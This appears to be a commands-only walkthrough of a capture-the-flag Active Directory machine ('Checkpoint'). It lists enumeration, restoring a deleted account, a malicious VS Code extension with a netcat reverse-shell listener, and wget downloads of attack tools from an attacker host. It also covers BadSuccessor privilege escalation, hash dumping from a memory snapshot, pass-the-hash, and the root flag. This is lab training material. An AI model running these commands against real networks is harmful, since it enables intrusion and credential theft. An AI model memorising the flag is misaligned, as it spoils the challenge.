# Commands Reference

## 1. Reconnaissance and Initial Enumeration

### Port Scanning

```bash
nmap 10.129.120.225

nmap -sC -sV -T4 -oA checkpoint_ 10.129.120.225
```

### SMB Share Enumeration

```bash
netexec smb 10.129.120.225 -u 'alex.turner' -p 'Checkpoint2024!' --shares
```

### Connecting to SMB Shares

```bash
smbclient '//10.129.120.225/DevDrop' -U 'alex.turner%Checkpoint2024!' -W checkpoint.htb
```

Inside the SMB session:

```bash
ls
```

### User Enumeration via LDAP

```bash
netexec ldap 10.129.120.225 -u 'alex.turner' -p 'Checkpoint2024!' --users | awk '/DC01/ && !/\[\*\]/ && !/\[\+\]/ && !/-Username-/ {print $5}'
```



## 2. Kerberos and Infrastructure Preparation

### Generate Kerberos Configuration

```bash
netexec smb 10.129.120.225 -u 'alex.turner' -p 'Checkpoint2024!' --generate-krb5-conf krb5.conf
```

### Set Kerberos Environment Variable

```bash
export KRB5_CONFIG=krb5.conf
```

### Synchronize Time

```bash
sudo ntpdate 10.129.120.225
```

### Update Hosts File

```bash
echo "10.129.120.225 DC01 DC01.checkpoint.htb checkpoint.htb" | sudo tee -a /etc/hosts
```



## 3. BloodHound Enumeration

### BloodHound CE Python Collector

```bash
bloodhound-ce-python -c All --dns-tcp -d checkpoint.htb -ns 10.129.120.225 -dc DC01.checkpoint.htb -u 'alex.turner' -p 'Checkpoint2024!' --use-ldaps --zip
```

### Alternative Collection with bloodyAD

```bash
bloodyAD -d checkpoint.htb --host DC01.checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get bloodhound
```



## 4. Lateral Movement – Restoring a Deleted Object

### Identify Writable Objects

```bash
bloodyAD --host DC01.checkpoint.htb -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get writable
```

### Restore Deleted User

```bash
bloodyAD -d checkpoint.htb --host DC01.checkpoint.htb -u alex.turner -p 'Checkpoint2024!' set restore 'CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb'
```

### Verify Restored Account

```bash
netexec smb 10.129.120.225 -u 'Mark.Davies' -p 'Checkpoint2024!'

netexec smb 10.129.120.225 -u 'Mark.Davies' -p 'Checkpoint2024!' --shares
```



## 5. Initial Access – VS Code Extension

### Create Extension Structure

```bash
mkdir evil-ext && cd evil-ext

mkdir -p extension
```

### Package Extension

```bash
zip -r ../evil.vsix '[Content_Types].xml' extension/
```

### Upload Extension

```bash
smbclient '//10.129.120.225/DevDrop' -u 'checkpoint.htb/Mark.Davies%Checkpoint2024!'
```

Inside the SMB session:

```bash
put evil.vsix
```

### Listener

```bash
nc -lvnp 4444
```



## 6. Privilege Escalation – BadSuccessor

### Start Web Server

```bash
python3 -m http.server 8080
```

### Transfer Required Files

```powershell
wget "http://10.10.14.33/Get-BadSuccessorOUPermissions.ps1" -OutFile "C:\Users\ryan.brooks\Desktop\Get-BadSuccessorOUPermissions.ps1"

wget "http://10.10.14.33/SharpSuccessor.exe" -OutFile "C:\Users\ryan.brooks\Desktop\SharpSuccessor.exe"

wget "http://10.10.14.33/Rubeus.exe" -OutFile "C:\Users\ryan.brooks\Desktop\Rubeus.exe"
```

### Identify Vulnerable OUs

```powershell
.\Get-BadSuccessorOUPermissions.ps1
```

```bash
netexec ldap 10.129.120.225 -u 'Mark.Davies' -p 'Checkpoint2024!' -M badsuccessor
```

### Ticket Handling

```powershell
.\Rubeus.exe tgtdeleg /nowrap
```

```bash
cat ryan.b64_kirbi | base64 -d > ryan.kirbi

impacket-ticketConverter ryan.kirbi ryan.ccache
```

### Configure Kerberos Cache

```bash
export KRB5CCNAME=ryan.ccache
```

### Execute BadSuccessor

```bash
bloodyAD --host DC01.checkpoint.htb -d checkpoint.htb -u ryan.brooks -k ccache=/home/kali/htb/checkpoint/ryan.ccache add badSuccessor evil-dmsa -t 'CN=SVC_DEPLOY,OU=SERVICEACCOUNTS,DC=CHECKPOINT,DC=HTB' --ou 'OU=DMSAHolder,DC=checkpoint,DC=htb'
```



## 7. Post-Exploitation – Memory Forensics

### Authenticate to Backup Share

```bash
netexec smb 10.129.120.225 -u svc_deploy -H e16081eb077aca74bdbf8af12af43ac9
```

```bash
smbclient //10.129.120.225/VMBackups -U 'checkpoint.htb/svc_deploy%e16081eb077aca74bdbf8af12af43ac9' --pw-nt-hash
```

Inside the SMB session:

```bash
ls
```

### Download Snapshot

```bash
mkdir -p loot/vmbackup
```

```bash
smbclient //10.129.120.225/VMBackups -U 'checkpoint.htb/svc_deploy%e16081eb077aca74bdbf8af12af43ac9' --pw-nt-hash -c 'lcd loot/vmbackup; cd "NightlyBackup_2024-11-01/memory forensics"; get "Windows Server 2019-Snapshot1.vmem"'
```

### Volatility Environment

```bash
python3 -m venv .venv-vol

.venv-vol/bin/pip install --upgrade pip

.venv-vol/bin/pip install volatility3 pycryptodome
```

### Memory Analysis

```bash
.venv-vol/bin/vol -q -f "loot/vmbackup/Windows Server 2019-Snapshot1.vmem" windows.info.Info

.venv-vol/bin/vol -q -f "loot/vmbackup/Windows Server 2019-Snapshot1.vmem" windows.registry.hivelist.HiveList

.venv-vol/bin/vol -q -f "loot/vmbackup/Windows Server 2019-Snapshot1.vmem" windows.hashdump.Hashdump
```



## 8. Domain Compromise

### Authenticate as Administrator

```bash
netexec smb 10.129.120.225 -u administrator -H f29e9c014295b9b32139b09a2790be3b
```

### Obtain Root Flag

```bash
evil-winrm-py -i 10.129.120.225 -u administrator -H f29e9c014295b9b32139b09a2790be3b
```

```powershell
Get-Content C:\Users\max.palmer\Desktop\root.txt
```

### Root Flag

```text
3788b2f6a4fdc4117f874933a856358d
```
